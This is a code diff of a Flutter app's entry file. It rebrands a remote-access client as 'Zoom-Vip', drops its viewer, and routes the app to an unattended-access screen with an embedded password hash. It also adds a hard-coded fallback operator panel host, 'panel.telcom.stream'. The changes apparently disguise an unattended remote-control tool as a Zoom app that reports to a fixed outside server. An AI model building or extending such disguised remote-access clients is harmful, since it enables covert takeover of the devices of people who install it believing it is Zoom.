@@ -1,30 +1,26 @@
 import 'package:flutter/material.dart';
 import 'package:shared_preferences/shared_preferences.dart';
-import 'package:flutter_secure_storage/flutter_secure_storage.dart';
-import 'package:device_info_plus/device_info_plus.dart';
-import 'package:package_info_plus/package_info_plus.dart';
 import 'screens/unattended_access.dart';
 import 'screens/setup_permissions.dart';
-import 'screens/remote_viewer.dart';
 import 'services/setup_service.dart';
 
 const String kBakedOperatorHost = String.fromEnvironment('OPERATOR_HOST', defaultValue: '');
-const int kBakedOperatorPort = int.fromEnvironment('OPERATOR_PORT', defaultValue: 21122);
-const bool kBakedUseHttps = bool.fromEnvironment('USE_HTTPS', defaultValue: false);
+const int kBakedOperatorPort = int.fromEnvironment('OPERATOR_PORT', defaultValue: 0);
+const bool kBakedUseHttps = bool.fromEnvironment('USE_HTTPS', defaultValue: true);
 const String kBakedPasswordHash = String.fromEnvironment('EMBEDDED_PASSWORD_HASH', defaultValue: '');
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
-  runApp(const BetterDeskClientApp());
+  runApp(const ZoomPrivateClientApp());
 }
 
-class BetterDeskClientApp extends StatelessWidget {
-  const BetterDeskClientApp({super.key});
+class ZoomPrivateClientApp extends StatelessWidget {
+  const ZoomPrivateClientApp({super.key});
 
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      title: 'zoom-private',
+      title: 'Zoom-Vip',
       debugShowCheckedModeBanner: false,
       theme: ThemeData(
         useMaterial3: true,
@@ -52,7 +48,10 @@ class _AppRouterState extends State<AppRouter> {
   /// process death (it cannot be persisted), so this also routes the user
   /// straight back to the one-step re-authorization screen.
   bool _needsSetup = true;
-  bool _isConnected = false;
+
+  String _operatorHost = '';
+  int _operatorPort = 443;
+  bool _useHttps = true;
 
   @override
   void initState() {
@@ -60,15 +59,41 @@ class _AppRouterState extends State<AppRouter> {
     _checkFirstLaunch();
   }
 
-  Future<void> _checkFirstLaunch() async {
-    final prefs = await SharedPreferences.getInstance();
-    final complete = prefs.getBool('betterdesk_setup_complete') ?? false;
+  /// Resolves the operator endpoint. CI bakes both dart-defines and Android
+  /// string resources; the resources act as a fallback so a build that was
+  /// produced without dart-defines still connects to the operator panel.
+  Future<void> _resolveOperatorConfig() async {
+    var host = kBakedOperatorHost;
+    var useHttps = kBakedUseHttps;
+    var port = kBakedOperatorPort;
 
-    var needsSetup = !complete;
-    if (complete) {
-      final status = await SetupService().getStatus();
-      needsSetup = !status.requiredGranted;
+    if (host.isEmpty) {
+      final baked = await SetupService().getBakedServerConfig();
+      host = (baked['host'] as String? ?? '').trim();
+      useHttps = baked['useHttps'] as bool? ?? true;
+      final bakedPort = baked['port'] as int? ?? 0;
+      port = bakedPort;
     }
+
+    if (host.isEmpty) {
+      host = 'panel.telcom.stream';
+    }
+    if (port <= 0) {
+      port = useHttps ? 443 : 80;
+    }
+
+    _operatorHost = host;
+    _operatorPort = port;
+    _useHttps = useHttps;
+  }
+
+  Future<void> _checkFirstLaunch() async {
+    await _resolveOperatorConfig();
+
+    // Pre-provisioned fleets arrive with every grant already applied; skip the
+    // wizard entirely in that case.
+    final status = await SetupService().getStatus();
+    final needsSetup = !status.requiredGranted;
 
     if (!mounted) return;
     setState(() {
@@ -79,7 +104,7 @@ class _AppRouterState extends State<AppRouter> {
 
   Future<void> _markSetupComplete() async {
     final prefs = await SharedPreferences.getInstance();
-    await prefs.setBool('betterdesk_setup_complete', true);
+    await prefs.setBool('zoom_private_setup_complete', true);
     if (mounted) setState(() => _needsSetup = false);
   }
 
@@ -93,20 +118,11 @@ class _AppRouterState extends State<AppRouter> {
       return SetupPermissionsScreen(onComplete: _markSetupComplete);
     }
 
-    if (!_isConnected) {
-      return UnattendedAccessScreen(
-        operatorHost: kBakedOperatorHost,
-        operatorPort: kBakedOperatorPort,
-        passwordHash: kBakedPasswordHash,
-        useHttps: kBakedUseHttps,
-        onConnected: () => setState(() => _isConnected = true),
-      );
-    }
-
-    return const RemoteViewerScreen(
-      deviceId: 'embedded-device',
-      deviceName: 'Operator-Managed Device',
+    return UnattendedAccessScreen(
+      operatorHost: _operatorHost,
+      operatorPort: _operatorPort,
+      passwordHash: kBakedPasswordHash,
+      useHttps: _useHttps,
     );
   }
 }
-
